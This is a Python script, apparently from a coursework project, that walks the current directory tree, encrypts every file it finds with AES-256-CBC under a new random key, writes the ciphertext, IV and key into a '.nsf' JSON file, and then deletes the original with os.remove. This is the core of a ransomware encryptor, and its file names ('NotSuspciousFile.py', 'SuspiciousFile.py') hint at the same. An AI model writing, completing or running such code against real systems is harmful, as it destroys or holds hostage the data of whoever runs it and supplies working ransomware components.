import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import base64
import pdb
import Constants as const
import json

##########################################################
# Using a generated IV and predetermined key, a file is 
# encrypted using AES-256 CBC
##########################################################
def MyEncrypt(file, key):
    #Return an error if the key length is not length 32
    if(len(key) != const.ENC_DEC_KEY_LENGTH) :
        raise ValueError('Key length must be of size 32')
    #Generate an IV of length 16
    IV = generateRandom(const.IV_KEY_LENGTH)
    #Generate cipher text
    cipher = createCipher(IV, key)
    encryptor = cipher.encryptor()
    cipher_text = encryptor.update(file) + encryptor.finalize()
        
    return cipher_text, IV

##########################################################
# Using a 32-bit generated key, a file will be read into 
# Myencrypt to be encrypted, then stored into a JSON file.
##########################################################
def MyfileEncrypt(file_path):
    #Generates 32-bit key
    key = generateRandom(const.ENC_DEC_KEY_LENGTH)
    #Retrieve a padded file from the specified file_path variable
    file = get_padded_file(file_path)
    #Encrypt the above file
    cipher_text, IV = MyEncrypt(file, key)
    #Encode the cipher textex
    encoded_cipher_text = encode_text(cipher_text)
    encoded_IV = encode_text(IV)
    encoded_key = encode_text(key)
    #Extract the file enxtension
    split_string = file_path.split('.')
    file_name = split_string[0]
    file_extension = '.' + split_string[len(split_string) - 1]

    #Return the generated cipher text, 16-bit IV, 32-bit Key, and the
    #File extension
    return encoded_cipher_text, encoded_IV, encoded_key, file_extension, file_name

def get_padded_file(file_path): 
    read_file = None
    #Read the file from the file path
    with open(file_path, mode='rb') as file:
        read_file = file.read()
    #Pad the file
    padded_file = padFile(read_file)
    
    return padded_file

def encode_text(string):
    return base64.b64encode(string)

##########################################################
# A given file is padded into 128-bit blocks so that it 
# be ecrypted.
##########################################################
def padFile(file):
    padder = padding.PKCS7(128).padder()
    pddFile = padder.update(file)
    pddFile += padder.finalize()
    return pddFile

    
def generateRandom(key_length):
    #Idk if this is the right way to generate it
    return os.urandom(key_length)

##########################################################
#   Generates magic box to encrypt and decrypt files
##########################################################
def createCipher(iv, key):
    if(len(key) != 32) :
        raise ValueError('Key length must be of size 32')
    #Encrypt the message using the key and IV in CBC mode in AES
    backend = default_backend()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    return cipher
        
def stringify(item_list):
    #Holds all of the decoded items
    stringified_items = list()
    
    for i in range(len(item_list)):
        stringified_items.append(str(item_list[i]))
    
    return stringified_items[0], stringified_items[1], stringified_items[2]

if __name__ == '__main__':
    #Retrieves the path to the current location of this file
    curr_path = os.getcwd()
    #Force python to skip the python cache folder
    skip_folder = '\__pycache__'
    #Force python to remove these list of items from the root folder directory
    #Because it is our code
    skip_file_list = list(['NotSuspciousFile.py', 'SuspiciousFile.py','Constants.py','Constants.pyc'])
    for root, dirs, files in os.walk('.'):
        #The current folder that we are inspecting
        curr_folder = root.replace('.', '', 1)
        if(curr_folder == skip_folder):
            continue
        if(curr_folder == '') :
            files.remove(skip_file_list[0])
            files.remove(skip_file_list[1])
        for i in range(len(files)) :
            #file_to_encrypt is the absolute path to the file
            file_path = curr_path + curr_folder + "/" + files[i]
            #Generate cipher text, IV, Key, and file extension
            encoded_cipher, encoded_IV, encoded_key, ext, file = MyfileEncrypt(file_path)
            #Stringify the following list
            cipher, IV, key = stringify([encoded_cipher, encoded_IV, encoded_key])
            #Generate map
            item_map = {'c' : cipher, 'IV' : IV, 'key' : key, 'ext' : ext}
            #Generate Json
            dump = json.dumps(item_map)
            f = open(file+ ".nsf", "w+")
            f.write(dump)
            pdb.set_trace()
            os.remove(file_path)
            
            
            